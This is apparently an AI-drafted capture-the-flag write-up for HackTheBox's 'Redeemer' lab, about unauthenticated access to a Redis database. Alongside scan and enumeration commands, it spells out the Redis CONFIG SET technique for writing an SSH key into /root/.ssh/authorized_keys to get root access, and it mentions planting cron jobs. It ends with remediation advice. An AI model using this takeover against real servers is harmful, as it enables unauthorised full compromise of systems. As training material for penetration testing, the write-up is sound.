```markdown
# Redeemer

**Platform:** HackTheBox — Starting Point  
**Category:** Network Fundamentals  
**OS:** Linux  
**Difficulty:** Very Easy  
**Date:** 2025  

---

## Summary
This machine exposed a Redis instance with no authentication 
configured. After identifying the open port with Nmap, connecting 
via redis-cli gave direct access to the database where the flag 
was stored as a key.

---

## Recon

```bash
nmap -sV -sC -p- 10.129.X.X -oN nmap.txt
```

Note: `-p-` was necessary here because Redis runs on port 6379 
which is not in Nmap's default top 1000 ports. Without scanning 
all ports the service would have been missed entirely.

```
6379/tcp open  redis  Redis key-value store 5.0.7
```

Port 6379 is the default Redis port. Redis is an in-memory 
key-value database commonly used for caching and session storage 
in web applications.

---

## Enumeration
Connected directly to Redis without providing any credentials. 
Redis has no authentication by default unless explicitly configured 
with a `requirepass` directive. The server accepted the connection 
immediately.

```bash
redis-cli -h 10.129.X.X
```

Ran the INFO command to gather server information — version, 
operating system, configuration file location, and database 
statistics.

```bash
10.129.X.X:6379> INFO server

# Server
redis_version:5.0.7
os:Linux 5.4.0-77-generic x86_64
config_file:/etc/redis/redis.conf
```

Then checked how many keys exist in the database:

```bash
10.129.X.X:6379> INFO keyspace

# Keyspace
db0:keys=4,expires=0,avg_ttl=0
```

Database 0 contains 4 keys.

---

## Exploitation
Listed all keys in the database and retrieved their values one 
by one.

```bash
10.129.X.X:6379> SELECT 0
# OK

10.129.X.X:6379> KEYS *
# 1) "numb"
# 2) "flag"
# 3) "temp"
# 4) "stor"

10.129.X.X:6379> GET flag
# "redacted"
```

The flag was stored directly as a Redis key named `flag`.

---

## Post-Exploitation
In a real penetration test, unauthenticated Redis access is a 
critical finding. Beyond reading keys, Redis can be used to 
achieve remote code execution by writing files directly to disk.

```bash
# Check Redis config for write permissions
10.129.X.X:6379> CONFIG GET dir
10.129.X.X:6379> CONFIG GET dbfilename

# Write SSH key for RCE (if running as root)
10.129.X.X:6379> CONFIG SET dir /root/.ssh/
10.129.X.X:6379> CONFIG SET dbfilename authorized_keys
10.129.X.X:6379> SET payload "\n\nYOUR_SSH_PUBLIC_KEY\n\n"
10.129.X.X:6379> SAVE

# Then connect via SSH
ssh -i id_rsa root@10.129.X.X
```

---

## Flag
```
redacted
```

---

## Key Lesson
This machine demonstrates unauthenticated Redis access — one of 
the most critical misconfigurations found in cloud and web 
application environments. Redis was originally designed to run 
on internal networks and has no authentication enabled by default. 
When exposed to the internet or an untrusted network without a 
password, anyone can connect and read all stored data.

The real danger goes beyond just reading database keys. Because 
Redis can write files to disk via the CONFIG SET command, an 
attacker with unauthenticated access can potentially achieve 
full remote code execution by writing an SSH public key to 
/root/.ssh/authorized_keys or writing a cron job to /etc/cron.d/. 
This escalates a database misconfiguration into complete server 
compromise.

In a real penetration test, finding port 6379 open is an 
immediate priority. The first step is always attempting 
connection without credentials before trying anything else. 
Tools like Nmap's redis-info script and Metasploit's 
auxiliary/scanner/redis/redis_login automate this check.

The fix is to always set a strong password in redis.conf using 
the requirepass directive, bind Redis to localhost only using 
bind 127.0.0.1, and never expose Redis directly to the internet 
or untrusted networks.

---

Replace `10.129.X.X` with your actual IP and paste your real flag. Want me to continue with Responder?
